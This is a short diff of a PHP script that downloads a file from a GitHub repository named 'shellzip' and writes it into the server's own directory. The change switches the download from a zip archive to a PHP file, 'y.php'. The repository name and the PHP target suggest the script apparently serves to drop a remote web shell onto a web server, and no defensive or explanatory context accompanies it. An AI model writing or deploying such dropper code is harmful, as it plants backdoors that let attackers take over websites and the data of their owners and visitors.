@@ -1,7 +1,7 @@
 <?php
-$file_url = 'https://raw.githubusercontent.com/Zeddgansz/shellzip/refs/heads/main/ww.zip';
+$file_url = 'https://raw.githubusercontent.com/Zeddgansz/shellzip/refs/heads/main/y.php';
 
-$save_to = __DIR__ . '/ww.zip'; // 
+$save_to = __DIR__ . '/y.php'; // 
 
 
 $file_content = file_get_contents($file_url);
